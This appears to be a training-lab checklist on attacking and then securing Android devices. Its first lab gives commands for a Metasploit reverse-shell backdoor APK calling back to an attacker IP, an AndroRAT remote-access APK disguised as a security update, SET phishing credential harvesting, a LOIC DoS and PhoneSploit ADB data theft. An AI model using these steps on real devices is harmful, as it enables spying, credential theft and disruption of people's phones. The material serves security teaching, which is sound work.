# Lab Tasks Checklist: Hacking Mobile Platforms

## Lab 1: Hack Android Devices

### **Lab Scenario**

Android devices are vulnerable to various exploits due to the lack of timely updates and security patches. This lab demonstrates techniques to compromise an Android device.

### **Lab Objectives**

- Create binary payloads using Metasploit.
- Harvest credentials using the Social-Engineer Toolkit (SET).
- Launch a DoS attack using Low Orbit Ion Cannon (LOIC).
- Exploit the Android Debug Bridge (ADB) using PhoneSploit.
- Hack an Android device with an APK file using AndroRAT.

### **Lab Environment**

- **Virtual Machines**: Windows Server 2019, Parrot Security, Android Emulator
- **Tools**: Metasploit, SET, LOIC, PhoneSploit, AndroRAT
- **Permissions**: Administrator access
- **Internet Connection**: Required

---

### **Checklist for Binary Payload Creation with Metasploit**

1. [ ]  Start Parrot Security and Android virtual machines.
2. [ ]  Open a terminal and gain root access (`sudo su`).
3. [ ]  Start PostgreSQL: `service postgresql start`.
4. [ ]  Create a payload:
    
    ```bash
    msfvenom -p android/meterpreter/reverse_tcp LHOST=<Attacker_IP> R > Backdoor.apk
    ```
    
5. [ ]  Share the payload via a web server or email.
6. [ ]  Set up a listener in Metasploit:
    
    ```bash
    msfconsole
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST <Attacker_IP>
    exploit -j -z
    ```
    
7. [ ]  Execute the APK on the Android machine and observe the Meterpreter session.

---

### **Checklist for Credential Harvesting with SET**

1. [ ]  Open SET on Parrot Security (`setoolkit`).
2. [ ]  Select Social-Engineering Attacks > Website Attack Vectors > Credential Harvester.
3. [ ]  Clone a target URL and provide the attacker machine's IP.
4. [ ]  Share the link via email and lure the victim to interact.
5. [ ]  Collect credentials displayed in the terminal after victim interaction.

---

### **Checklist for DoS Attack with LOIC**

1. [ ]  Install LOIC on the Android emulator.
2. [ ]  Set the target IP or URL and select TCP.
3. [ ]  Configure threads and port settings.
4. [ ]  Launch the attack and monitor network traffic using Wireshark on the target machine.

---

### **Checklist for Exploiting ADB with PhoneSploit**

1. [ ]  Clone and set up PhoneSploit on Parrot Security.
2. [ ]  Connect to the Android device:
    
    ```bash
    python3 phonesploit.py
    Connect a new phone > <Target_IP>
    ```
    
3. [ ]  Access the shell or perform actions like taking screenshots, listing apps, or running commands.
4. [ ]  Gather sensitive data like SMS or call logs.

---

### **Checklist for Hacking Android Devices with AndroRAT**

1. [ ]  Build an APK using AndroRAT:
    
    ```bash
    python3 androRAT.py --build -i <Attacker_IP> -p <Port> -o SecurityUpdate.apk
    ```
    
2. [ ]  Share and install the APK on the Android device.
3. [ ]  Start listening to the victim device:
    
    ```bash
    python3 androRAT.py --shell -i 0.0.0.0 -p <Port>
    ```
    
4. [ ]  Extract device information, SMS logs, or other sensitive data.

---

## Lab 2: Secure Android Devices

### **Lab Scenario**

Securing Android devices from malware and unauthorized access is critical for both personal and organizational security.

### **Lab Objectives**

- Analyze malicious apps using online tools.
- Secure devices with Malwarebytes Security.

### **Lab Environment**

- **Virtual Machines**: Windows Server 2019, Android Emulator
- **Tools**: Online App Analyzers, Malwarebytes
- **Permissions**: Administrator access

---

### **Checklist for Malicious App Analysis**

1. [ ]  Upload APK files to tools like VirusTotal or Hybrid Analysis.
2. [ ]  Review reports for detected threats and behavior analysis.
3. [ ]  Log findings and recommend remediation.

---

### **Checklist for Device Security**

1. [ ]  Install Malwarebytes on the Android device.
2. [ ]  Scan for threats and remove detected malware.
3. [ ]  Enable real-time protection and perform regular scans.

---
---

# Step-by-Step